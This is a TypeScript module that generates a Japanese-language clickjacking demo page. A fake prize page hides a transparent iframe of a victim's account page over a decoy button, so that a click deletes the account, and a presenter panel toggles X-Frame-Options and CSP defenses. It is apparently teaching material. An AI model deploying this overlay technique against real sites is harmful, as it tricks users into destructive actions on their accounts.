// The attacker's trap page: a fake "you won a prize" landing page. A transparent
// iframe of the victim's account page sits on top of a decoy button, lined up so
// that clicking the decoy actually clicks the victim's hidden 退会 button.
//
// The control panel on the left is a *presenter* tool (opacity slider, defense
// switch, live status). A real attack would ship none of it — only the bait and
// the invisible frame.

export const trapPage = (victimOrigin: string): string => `<!doctype html>
<html lang="ja">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>🎁 プレゼントが当たりました！</title>
    <style>
      :root {
        color-scheme: light;
        font-family: system-ui, -apple-system, "Segoe UI", sans-serif;
        --frame-opacity: 0;
      }
      * {
        box-sizing: border-box;
      }
      body {
        margin: 0;
        min-height: 100vh;
        display: flex;
        background: linear-gradient(135deg, #fde68a, #fca5a5);
        color: #1f2937;
      }

      /* ---- presenter control panel (not part of the "attack") ---- */
      .panel {
        width: 320px;
        flex: 0 0 320px;
        background: #0f172a;
        color: #e2e8f0;
        padding: 20px;
        overflow-y: auto;
        height: 100vh;
        position: sticky;
        top: 0;
      }
      .panel h2 {
        font-size: 15px;
        margin: 0 0 4px;
        color: #38bdf8;
      }
      .panel .sub {
        font-size: 12px;
        color: #94a3b8;
        margin: 0 0 18px;
      }
      .panel section {
        border-top: 1px solid #1e293b;
        padding: 14px 0;
      }
      .panel label {
        font-size: 12px;
        font-weight: 600;
        display: block;
        margin-bottom: 6px;
      }
      .panel input[type="range"] {
        width: 100%;
      }
      .panel select,
      .panel button {
        width: 100%;
        padding: 8px 10px;
        border-radius: 8px;
        border: 1px solid #334155;
        background: #1e293b;
        color: #e2e8f0;
        font-size: 13px;
        cursor: pointer;
      }
      .panel button {
        margin-top: 8px;
      }
      .panel button.alt {
        background: #334155;
      }
      .status-grid {
        display: grid;
        grid-template-columns: auto 1fr;
        gap: 4px 10px;
        font-size: 13px;
      }
      .status-grid .k {
        color: #94a3b8;
      }
      .badge {
        display: inline-block;
        padding: 1px 8px;
        border-radius: 999px;
        font-size: 12px;
        font-weight: 700;
      }
      .badge.ok {
        background: #064e3b;
        color: #6ee7b7;
      }
      .badge.gone {
        background: #7f1d1d;
        color: #fecaca;
      }
      .steps {
        font-size: 12px;
        color: #cbd5e1;
        line-height: 1.6;
        padding-left: 18px;
        margin: 0;
      }

      /* ---- the bait + trap ---- */
      .stage {
        flex: 1;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 24px;
      }
      .trap {
        position: relative;
        width: 420px;
        height: 520px;
      }
      .bait {
        position: absolute;
        inset: 0;
        z-index: 1;
        background: #ffffff;
        border-radius: 18px;
        box-shadow: 0 18px 50px rgba(0, 0, 0, 0.25);
        padding: 28px;
        text-align: center;
        overflow: hidden;
      }
      .bait .confetti {
        font-size: 44px;
      }
      .bait h1 {
        font-size: 24px;
        margin: 10px 0 6px;
        color: #b45309;
      }
      .bait p {
        font-size: 14px;
        color: #475569;
        line-height: 1.6;
        margin: 6px 0;
      }
      /* Decoy button: same screen position as the victim's withdraw button. */
      .decoy {
        position: absolute;
        top: 360px;
        left: 50%;
        transform: translateX(-50%);
        width: 260px;
        height: 56px;
        border: 0;
        border-radius: 10px;
        background: #16a34a;
        color: #fff;
        font-size: 17px;
        font-weight: 700;
        box-shadow: 0 6px 16px rgba(22, 163, 74, 0.4);
        cursor: pointer;
      }
      /* The victim page, laid exactly over the bait. Transparent by default. */
      .victim-frame {
        position: absolute;
        inset: 0;
        width: 420px;
        height: 520px;
        border: 0;
        border-radius: 18px;
        z-index: 2;
        opacity: var(--frame-opacity);
        transition: opacity 0.15s linear;
      }
      .align-marker {
        position: absolute;
        top: 360px;
        left: 50%;
        transform: translateX(-50%);
        width: 260px;
        height: 56px;
        border: 2px dashed rgba(220, 38, 38, 0.7);
        border-radius: 10px;
        pointer-events: none;
        z-index: 3;
        display: none;
      }
      .trap.show-marker .align-marker {
        display: block;
      }
    </style>
  </head>
  <body>
    <aside class="panel">
      <h2>クリックジャッキング デモ（発表用パネル）</h2>
      <p class="sub">このパネルは解説用です。実際の攻撃ページには存在しません。</p>

      <section>
        <label for="opacity">被害ページの不透明度: <span id="opacity-val">0%</span></label>
        <input id="opacity" type="range" min="0" max="100" value="0" />
        <button class="alt" id="toggle-marker" type="button">クリック位置の目印を表示</button>
      </section>

      <section>
        <label for="protection">被害サイトの防御設定</label>
        <select id="protection">
          <option value="none">なし（脆弱 / デフォルト）</option>
          <option value="xfo-deny">X-Frame-Options: DENY</option>
          <option value="xfo-sameorigin">X-Frame-Options: SAMEORIGIN</option>
          <option value="csp">CSP: frame-ancestors 'none'</option>
        </select>
        <button class="alt" id="reload-frame" type="button">フレームを再読み込み</button>
      </section>

      <section>
        <label>被害アカウントの状態（1秒ごとに自動取得）</label>
        <div class="status-grid">
          <span class="k">状態</span><span id="st-exists">—</span>
          <span class="k">ログイン</span><span id="st-login">—</span>
          <span class="k">削除日時</span><span id="st-deleted">—</span>
          <span class="k">削除回数</span><span id="st-count">—</span>
        </div>
        <button id="reset" type="button">アカウントを復活（リセット）</button>
      </section>

      <section>
        <label>被害サイトを別タブで開く</label>
        <button class="alt" id="open-login" type="button">ログインページ</button>
        <button class="alt" id="open-account" type="button">アカウントページ</button>
      </section>

      <section>
        <label>デモの手順</label>
        <ol class="steps">
          <li>「ログインページ」で alice / password123 でログイン。</li>
          <li>このタブに戻る。状態が「ログイン: はい」になる。</li>
          <li>防御=なし のまま、緑の「景品を受け取る」を押す。</li>
          <li>状態が「削除済み」に変わる＝退会させられた。</li>
          <li>不透明度を上げると、下に隠れた退会ボタンが見える。</li>
          <li>リセット→再ログイン後、防御を DENY や CSP にして再挑戦。フレームが拒否され攻撃が失敗する。</li>
        </ol>
      </section>
    </aside>

    <main class="stage">
      <div class="trap" id="trap">
        <div class="bait">
          <div class="confetti">🎉🎁🎉</div>
          <h1>おめでとうございます！</h1>
          <p>あなたは当選しました。<br />豪華景品を受け取るには、下のボタンを押してください。</p>
          <p style="font-size:12px;color:#94a3b8;">※ 24時間以内に受け取らないと無効になります</p>
          <button class="decoy" type="button" id="decoy">景品を受け取る 🎁</button>
        </div>
        <div class="align-marker"></div>
        <iframe
          id="victim-frame"
          class="victim-frame"
          title="prize"
          src="${victimOrigin}/account?protection=none"
        ></iframe>
      </div>
    </main>

    <script>
      const VICTIM = ${JSON.stringify(victimOrigin)};
      const $ = (id) => document.getElementById(id);

      const opacity = $("opacity");
      const opacityVal = $("opacity-val");
      const frame = $("victim-frame");
      const protection = $("protection");
      const trap = $("trap");

      opacity.addEventListener("input", () => {
        const pct = Number(opacity.value);
        document.documentElement.style.setProperty("--frame-opacity", String(pct / 100));
        opacityVal.textContent = pct + "%";
      });

      const reloadFrame = () => {
        frame.src = VICTIM + "/account?protection=" + protection.value + "&t=" + Date.now();
      };
      protection.addEventListener("change", reloadFrame);
      $("reload-frame").addEventListener("click", reloadFrame);

      $("toggle-marker").addEventListener("click", () => {
        trap.classList.toggle("show-marker");
      });

      $("decoy").addEventListener("click", () => {
        // The decoy is purely visual: the real click lands on the iframe above it.
        // This handler only fires if the frame is blocked (nothing on top to catch
        // the click), which is a nice "the defense worked" signal.
        alert("（罠のボタン自体には何もありません。防御が有効だと、ここが直接押せてしまいます＝攻撃失敗）");
      });

      // Live status polling.
      const badge = (ok) =>
        '<span class="badge ' + (ok ? "ok" : "gone") + '">' + (ok ? "有効" : "削除済み") + "</span>";
      const pollStatus = async () => {
        try {
          const res = await fetch(VICTIM + "/api/status", {
            cache: "no-store",
            credentials: "include",
          });
          const s = await res.json();
          $("st-exists").innerHTML = badge(s.exists);
          $("st-login").textContent = s.loggedIn ? "はい" : "いいえ";
          $("st-deleted").textContent = s.deletedAt ? new Date(s.deletedAt).toLocaleString() : "—";
          $("st-count").textContent = String(s.deleteCount);
        } catch {
          $("st-exists").textContent = "（被害サーバーに接続できません）";
        }
      };
      setInterval(pollStatus, 1000);
      pollStatus();

      $("reset").addEventListener("click", async () => {
        try {
          await fetch(VICTIM + "/api/reset", { method: "POST", credentials: "include" });
        } catch {
          /* ignore */
        }
        reloadFrame();
        pollStatus();
      });

      $("open-login").addEventListener("click", () => window.open(VICTIM + "/", "_blank"));
      $("open-account").addEventListener("click", () =>
        window.open(VICTIM + "/account", "_blank"),
      );
    </script>
  </body>
</html>`;
